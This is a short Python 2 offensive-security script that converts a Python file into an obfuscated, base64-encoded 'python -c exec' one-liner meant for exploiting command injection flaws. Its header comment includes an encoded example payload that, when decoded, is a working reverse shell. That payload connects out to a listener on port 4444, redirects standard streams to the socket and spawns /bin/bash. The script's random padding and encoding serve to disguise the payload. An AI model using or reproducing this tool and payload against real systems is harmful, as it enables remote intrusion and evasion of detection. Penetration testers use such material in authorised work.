#!/usr/bin/env python2

# Author: @ropnop (Ronnie Flathers)
# Simple script to ingest a Python file (e.g. a shell) and return a oneliner command
# Useful with command injection vulns
# Based entirely off of Metasploit's "reverse_python.rb" payload
#   Credit to Brendan Coles <bcoles[at]gmail.com>
#
# Example:
#   $ python make_oneliner.py pty_shell.py
#       python -c "exec('aW1wb3J0IG9zICAgICAgICA7ICBpbXBvcnQgcHR5ICAgICAgICA7ICBpbXBvcnQgc29ja2V0ICAgICAgICA7ICBsaG9zdCA9ICIxMjcuMC4wLjEiICAgICAgICA7ICBscG9ydCA9IDQ0NDQgICAgICAgIDsgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVUICAgICAgICAgICwgICAgICBzb2NrZXQuU09DS19TVFJFQU0pICAgICAgICA7ICBzLmNvbm5lY3QoKGxob3N0ICAgICAgICAgICwgICAgICBscG9ydCkpICAgICAgICA7ICBvcy5kdXAyKHMuZmlsZW5vKCkgICAgICAgICAgLCAgICAgMCkgICAgICAgIDsgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICAgICAsICAgICAxKSAgICAgICAgOyAgb3MuZHVwMihzLmZpbGVubygpICAgICAgICAgICwgICAgIDIpICAgICAgICA7ICBvcy5wdXRlbnYoIkhJU1RGSUxFIiAgICAgICAgICAsICAgICAnL2Rldi9udWxsJykgICAgICAgIDsgIHB0eS5zcGF3bigiL2Jpbi9iYXNoIikgICAgICAgIDsgIHMuY2xvc2UoKQ=='.decode('base64'))"
#
# Note: this really only works well on small, simple scripts with no tabs, methods, etc. YMMV

import sys
from random import randint
import base64

EXEC_COMMAND = "python -c \"exec('{}'.decode('base64'))\""

def randompadding():
    return " "*randint(1,10)

def getScript(infile):
    with open(infile, 'r') as fp:
        lines = [line.strip() for line in fp if line.strip()] #only read non-blank lines
    return ";".join(lines) #join lines with a ;

def makeOneLiner(script):
    script = script.replace(",","{},{}".format(randompadding(),randompadding())) #add padding around commas
    script = script.replace(";","{};{}".format(randompadding(), randompadding())) #add padding around semicolons
    return script

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print "Usage: {} <python file>".format(sys.argv[0])
        sys.exit(1)
    
    script = getScript(sys.argv[1])
    oneliner = makeOneLiner(script)

    print EXEC_COMMAND.format(base64.b64encode(oneliner))
